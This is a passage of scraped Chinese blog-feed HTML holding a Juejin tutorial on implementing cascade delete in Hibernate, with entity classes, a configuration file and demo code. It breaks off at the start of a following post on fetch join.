itemprop="headline" content="Hibernate（43）Hibernate中的级联删除如何实现？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-15T11:46:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernate（43）Hibernate中的级联删除如何实现？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T11:46:17.000Z" title="Thu Jan 15 2026 11:46:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在Hibernate中，级联删除（Cascade Delete）是指当删除一个实体时，自动删除与之相关联的其他实体。Hibernate通过配置级联类型来实现这一功能。常用的级联类型包括：</p>
<ul>
<li><code>CascadeType.ALL</code>：对所有操作进行级联（包括<code>PERSIST</code>、<code>MERGE</code>、<code>REMOVE</code>等）。</li>
<li><code>CascadeType.REMOVE</code>：级联删除操作。</li>
<li><code>CascadeType.PERSIST</code>：级联保存操作。</li>
<li><code>CascadeType.MERGE</code>：级联合并操作。</li>
<li><code>CascadeType.REFRESH</code>：级联刷新操作。</li>
<li><code>CascadeType.DETACH</code>：级联分离操作。</li>
</ul>
<p>以下是一个详细的示例，展示如何在Hibernate中实现级联删除。</p>
<h3 data-id="heading-0">示例</h3>
<p>假设我们有两个实体类：<code>Category</code>和<code>Product</code>，其中<code>Category</code>和<code>Product</code>是一对多关系。当我们删除一个<code>Category</code>时，自动删除与之关联的所有<code>Product</code>。</p>
<h4 data-id="heading-1">步骤一：定义实体类</h4>
<h5 data-id="heading-2"><code>Category</code>实体类</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.*;
<span class="hljs-keyword">import</span> java.util.HashSet;
<span class="hljs-keyword">import</span> java.util.Set;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "category")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Category</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;

    <span class="hljs-meta">@Column(name = "name")</span>
    <span class="hljs-keyword">private</span> String name;

    <span class="hljs-meta">@OneToMany(mappedBy = "category", cascade = CascadeType.ALL, orphanRemoval = true)</span>
    <span class="hljs-keyword">private</span> Set&lt;Product&gt; products = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();

    <span class="hljs-comment">// Getters 和 Setters</span>

    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }

    <span class="hljs-keyword">public</span> Set&lt;Product&gt; <span class="hljs-title function_">getProducts</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> products;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setProducts</span><span class="hljs-params">(Set&lt;Product&gt; products)</span> {
        <span class="hljs-built_in">this</span>.products = products;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addProduct</span><span class="hljs-params">(Product product)</span> {
        products.add(product);
        product.setCategory(<span class="hljs-built_in">this</span>);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeProduct</span><span class="hljs-params">(Product product)</span> {
        products.remove(product);
        product.setCategory(<span class="hljs-literal">null</span>);
    }
}
</code></pre>
<h5 data-id="heading-3"><code>Product</code>实体类</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "product")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Product</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;

    <span class="hljs-meta">@Column(name = "name")</span>
    <span class="hljs-keyword">private</span> String name;

    <span class="hljs-meta">@Column(name = "price")</span>
    <span class="hljs-keyword">private</span> Double price;

    <span class="hljs-meta">@ManyToOne</span>
    <span class="hljs-meta">@JoinColumn(name = "category_id")</span>
    <span class="hljs-keyword">private</span> Category category;

    <span class="hljs-comment">// Getters 和 Setters</span>

    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }

    <span class="hljs-keyword">public</span> Double <span class="hljs-title function_">getPrice</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> price;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPrice</span><span class="hljs-params">(Double price)</span> {
        <span class="hljs-built_in">this</span>.price = price;
    }

    <span class="hljs-keyword">public</span> Category <span class="hljs-title function_">getCategory</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> category;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCategory</span><span class="hljs-params">(Category category)</span> {
        <span class="hljs-built_in">this</span>.category = category;
    }
}
</code></pre>
<h4 data-id="heading-4">步骤二：配置Hibernate</h4>
<p>我们需要一个配置文件来配置Hibernate连接和映射。</p>
<h5 data-id="heading-5">Hibernate配置文件 <code>hibernate.cfg.xml</code></h5>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span>
        <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span>
        <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- 数据库连接配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/your_database<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>your_username<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>your_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- Hibernate 属性配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.format_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.hbm2ddl.auto"</span>&gt;</span>update<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- 映射类 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Product"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Category"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h4 data-id="heading-6">步骤三：实用类HibernateUtil</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateUtil</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> SessionFactory <span class="hljs-title function_">getSessionFactory</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> sessionFactory;
    }
}
</code></pre>
<h4 data-id="heading-7">步骤四：实现级联删除</h4>
<p>我们可以编写一个方法来演示级联删除的效果。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;
<span class="hljs-keyword">import</span> com.example.domain.Category;
<span class="hljs-keyword">import</span> com.example.domain.Product;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateCascadeDeleteExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 获取SessionFactory</span>
        <span class="hljs-type">SessionFactory</span> <span class="hljs-variable">sessionFactory</span> <span class="hljs-operator">=</span> HibernateUtil.getSessionFactory();

        <span class="hljs-comment">// 插入示例数据</span>
        insertSampleData(sessionFactory);

        <span class="hljs-comment">// 测试级联删除</span>
        testCascadeDelete(sessionFactory);

        <span class="hljs-comment">// 关闭SessionFactory</span>
        sessionFactory.close();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertSampleData</span><span class="hljs-params">(SessionFactory sessionFactory)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Category</span> <span class="hljs-variable">category</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Category</span>();
            category.setName(<span class="hljs-string">"Electronics"</span>);

            <span class="hljs-type">Product</span> <span class="hljs-variable">product1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>();
            product1.setName(<span class="hljs-string">"Laptop"</span>);
            product1.setPrice(<span class="hljs-number">1000.0</span>);

            <span class="hljs-type">Product</span> <span class="hljs-variable">product2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>();
            product2.setName(<span class="hljs-string">"Smartphone"</span>);
            product2.setPrice(<span class="hljs-number">500.0</span>);

            category.addProduct(product1);
            category.addProduct(product2);

            session.save(category);

            transaction.commit();
            System.out.println(<span class="hljs-string">"Inserted sample data"</span>);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close();
        }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testCascadeDelete</span><span class="hljs-params">(SessionFactory sessionFactory)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 获取Category</span>
            <span class="hljs-type">Category</span> <span class="hljs-variable">category</span> <span class="hljs-operator">=</span> session.get(Category.class, <span class="hljs-number">1L</span>);
            <span class="hljs-keyword">if</span> (category != <span class="hljs-literal">null</span>) {
                <span class="hljs-comment">// 删除Category</span>
                session.delete(category);
                transaction.commit();
                System.out.println(<span class="hljs-string">"Category and associated Products deleted"</span>);
            }
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close();
        }
    }
}
</code></pre>
<h3 data-id="heading-8">详细解释</h3>
<ol>
<li>
<p><strong>定义实体类</strong>：</p>
<ul>
<li><code>Category</code>类与<code>Product</code>类是一对多关系，<code>Category</code>可以有多个<code>Product</code>。</li>
<li>在<code>Category</code>类中，<code>@OneToMany</code>注解用于定义与<code>Product</code>的关联关系，并且通过<code>cascade = CascadeType.ALL</code>指定所有操作（包括删除）都进行级联处理。同时，<code>orphanRemoval = true</code>确保孤儿对象（即不再被引用的子对象）也会被删除。</li>
<li><code>Product</code>类中的<code>@ManyToOne</code>注解用于定义与<code>Category</code>的多对一关系。</li>
</ul>
</li>
<li>
<p><strong>配置文件</strong>：</p>
<ul>
<li><code>hibernate.cfg.xml</code>配置文件用于设置数据库连接、Hibernate属性和映射类。</li>
</ul>
</li>
<li>
<p><strong>实用类HibernateUtil</strong>：</p>
<ul>
<li><code>HibernateUtil</code>类提供了获取<code>SessionFactory</code>实例的方法。</li>
</ul>
</li>
<li>
<p><strong>实现级联删除</strong>：</p>
<ul>
<li>在<code>insertSampleData</code>方法中，创建并保存一个<code>Category</code>和两个关联的<code>Product</code>。</li>
<li>在<code>testCascadeDelete</code>方法中，获取一个<code>Category</code>对象并将其删除。由于配置了级联删除，相关联的<code>Product</code>对象也会被自动删除。</li>
</ul>
</li>
</ol>
<p>通过这种方式，可以轻松实现Hibernate中的级联删除功能，以确保在删除主实体时自动删除关联的子实体，从而保持数据的一致性和完整性。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernate（44）Hibernate中的fetch join是什么？]]></title>    <link>https://juejin.cn/post/7595150851477831723</link>    <guid>https://juejin.cn/post/7595150851477831723</guid>    <pubDate>2026-01-15T11:47:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595150851477831723" data-draft-id="7595178023256915987" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernate（44）Hibernate中的fetch join是什么？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-15T11:47:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernate（44）Hibernate中的fetch join是什么？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T11:47:00.000Z" title="Thu Jan 15 2026 11:47:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 